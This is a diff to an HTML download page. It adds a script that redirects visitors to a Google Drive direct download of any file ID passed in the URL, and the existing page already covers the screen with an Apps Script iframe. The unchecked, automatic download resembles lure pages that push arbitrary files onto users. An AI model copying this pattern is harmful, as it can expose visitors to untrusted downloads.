@@ -26,6 +26,9 @@
   </style>
 </head>
 <body>
+
+
+  
  <iframe 
 
   src="https://script.google.com/macros/s/AKfycbwDvPz3ewGd6Lc6tgTvypQWAoT-MgiktsPvIBBIgB2C44ods9ua2exCCQJtaX4rse2r/exec?search=download" 
@@ -34,6 +37,20 @@
   height="100%" 
   style="position: fixed; top: 0; left: 0; border: none; margin: 0; padding: 0; overflow: hidden; z-index: 999999;">
 </iframe>
+
+
+  <script>
+const url = new URL(window.location.href);
+const fileId = url.searchParams.get("fileId");
+
+if (fileId) {
+    window.location.href = 
+      "https://drive.google.com/uc?export=download&id=" + fileId;
+}
+</script>
+
+<h3>Your Excel download will start shortly...</h3>
+
 </body>
 </html>
 
